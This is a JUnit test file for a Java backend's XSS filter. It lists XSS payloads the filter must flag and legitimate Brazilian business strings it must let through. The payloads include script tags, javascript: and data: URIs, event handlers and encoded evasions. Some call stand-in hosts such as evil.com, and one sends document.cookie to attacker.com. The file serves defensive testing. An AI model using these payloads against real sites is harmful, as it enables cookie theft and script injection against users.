package com.empresa.backend;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class XssDefenseTest {

    @ParameterizedTest
    @ValueSource(strings = {
        // 1. Tags de script
        "<script>alert('XSS')</script>",
        "<SCRIPT SRC=\"https://evil.com/xss.js\"></SCRIPT>",
        "<script>document.cookie='admin=true'</script>",
        "<script type=\"text/javascript\">alert(1);</script>",
        "</script><script>alert(1)</script>",

        // 2. Esquemas perigosos de pseudo-protocolo
        "javascript:alert('XSS')",
        "JAVASCRIPT:alert(document.cookie)",
        "javascript:void(0)",
        "vbscript:msgbox(\"XSS\")",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",

        // 3. Event handlers HTML inline
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<svg onload=\"alert(document.domain)\">",
        "<body onload=alert('XSS')>",
        "<input type=\"text\" autofocus onfocus=\"alert(1)\">",
        "<button onclick=\"alert(1)\">Clique aqui</button>",
        "<a onmouseover=\"alert('XSS')\">Passe o mouse</a>",
        "<details open ontoggle=\"alert(1)\">",

        // 4. Injeções de tags perigosas
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<object data=\"javascript:alert(1)\"></object>",
        "<embed src=\"https://evil.com/xss.swf\">",
        "<link rel=\"stylesheet\" href=\"javascript:alert(1)\">",

        // 5. Chamadas de avaliação e evasões com encoding
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "eval('alert(1)')",
        "window.location('https://evil.com')",
        "document.location=\"https://attacker.com/steal?\"+document.cookie"
    })
    @DisplayName("Deve detectar e bloquear vetores conhecidos de Cross-Site Scripting (XSS)")
    void deveDetectarXss(String payloadMalicioso) {
        assertTrue(XssDefenseFilter.containsXss(payloadMalicioso),
                "Deveria ter identificado ataque XSS no payload: " + payloadMalicioso);
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "Henrique & Otavio - VERTEX",
        "Pizzaria & Restaurante Bella Itália LTDA",
        "Av. Coronel Guilherme de Paula, nº 1470 - Centro",
        "Laranjeiras do Sul - Paraná",
        "contato@vertex.com.br",
        "https://www.vertextecnologia.com.br",
        "http://lojadonjoao.com.br/produtos",
        "12.345.678/0001-90",
        "(42) 9988-7766",
        "Relatório comercial: faturamento cresceu 25% no último trimestre.",
        "Desenvolvimento de Website Institucional e Plataforma Web",
        "Preço: R$ 1.500,00 à vista ou 3x de R$ 550,00",
        "page=0&size=20&cidade=Laranjeiras+do+Sul",
        "Categoria: Comércio & Varejo"
    })
    @DisplayName("Deve permitir textos legítimos sem falsos positivos")
    void devePermitirValoresLegitimos(String textoLegitimo) {
        assertFalse(XssDefenseFilter.containsXss(textoLegitimo),
                "Não deveria ter bloqueado texto legítimo: " + textoLegitimo);
    }
}
